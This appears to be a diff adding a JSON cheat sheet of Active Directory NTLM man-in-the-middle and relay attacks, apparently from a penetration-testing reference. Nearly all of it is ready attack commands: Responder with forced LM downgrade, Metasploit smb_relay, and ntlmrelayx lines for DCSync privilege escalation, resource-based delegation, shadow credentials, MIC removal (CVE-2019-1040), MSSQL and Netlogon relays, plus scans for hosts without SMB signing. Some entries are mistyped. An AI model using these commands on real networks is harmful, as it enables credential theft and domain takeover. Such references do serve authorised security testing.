@@ -1,0 +1,66 @@
+{
+  "MITM (Listen and Relay)": {
+    "Listener": {
+      "Listen": {
+        "commands": [
+          "responder -i eth0 (use --lm to force lm downgrade)",
+          "smbclient.py"
+        ],
+        "access_gained": ["NetNtlmv1", "NetNtlmv2", "User"]
+      }
+    },
+    "NTLM_Relay": {
+      "relay_on_itself": {
+        "vulnerability": "MS08-068",
+        "command": "use exploit/windows/smb/smb_relay # windows2000 / windows server2008",
+        "access_gained": "Admin"
+      },
+      "SMB_to_LDAP": {
+        "NetNTLMv1": {
+          "action": "remove mic",
+          "relay_paths": {
+            "DcSync": "ntlmrelayx.py --remove-mic --escalate-user <user> -t ldap://<dc_fqdn> --smb2support",
+            "RBCD": "ntlmrelayx.py -t ldap://<dc> --remove-mic --add-computer <computer_name> <computer_password> --delegate-access --smb2support",
+            "shadow_credentials": "ntlmrelayx.py -t ldap://<dc> --shadow-credentials --shadow-target '<dc>'",
+            "Users": "ntlmrelayx.py -wh <attacker_ip> -t ldap://<target> -l /tmp -6 -debug"
+          }
+        },
+        "NetNTLMv2": {
+          "vulnerability": "remove mic (CVE-2019-1040)"
+        }
+      },
+      "SMB_unsigned": {
+        "find_unsigned": {
+          "commands": [
+            "nmap -Pn -sS -T4 --open --script smb-security-mode -p445 ADDRESS/MASK",
+            "use exploit/windows/smb/smb_relay",
+            "cme smb Shosts --gen-relay-list relay.txt"
+          ]
+        },
+        "relay_commands": {
+          "domain_enum": "ntlmrelayx.py -tf targets.txt --smb2support (-6) --enum-domain",
+          "lateral_move": "ntlmrelayx.py -tf targets.txt smb2support -socks (-6)",
+          "access_gained": "Users"
+        }
+      },
+      "HTTP_ADCS": {
+        "method": "sccm ntlm relay attack",
+        "result": "ESCR"
+      },
+      "MSSQL": {
+        "command": "ntlmrelayx.py -t mssql://<ip> -smb2support -socks",
+        "result": "lateral move (socks)"
+      },
+      "SMB_to_Netlogon": {
+        "vulnerability": "Zero-Logon (safe method) CVE-2020-1472",
+        "description": "coerce come from dc01, relay to dc02",
+        "command": "ntlmrelayx.py -t dcsync://<dc_02.ip> -smb2support -auth-smb <user>:<password>",
+        "result": "DcSync"
+      }
+    },
+    "Arp_poisoning": {
+      "method": "wsus relay",
+      "tool": "pywsus.py"
+    }
+  }
+}
